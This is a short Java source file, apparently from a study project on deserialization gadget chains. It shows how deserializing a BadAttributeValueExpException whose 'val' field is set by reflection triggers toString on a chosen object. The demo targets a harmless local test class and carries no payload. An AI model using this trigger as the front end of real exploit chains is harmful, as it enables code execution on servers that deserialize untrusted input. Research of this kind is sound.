package com.xiinnn.readobject2tostring;

import com.xiinnn.template.ToStringClass;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;

// BadAttributeValueExpException#readObject -> getter
public class BAVEReadObject2ToString {
    public static void main(String[] args) throws Exception{
        ToStringClass toStringClass = new ToStringClass();
        BadAttributeValueExpException bave = new BadAttributeValueExpException(null);
        setFieldValue(bave, "val", toStringClass);

        // 成功调用 GetterClass#getName
        byte[] bytes = serialize(bave);
        unserialize(bytes);
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
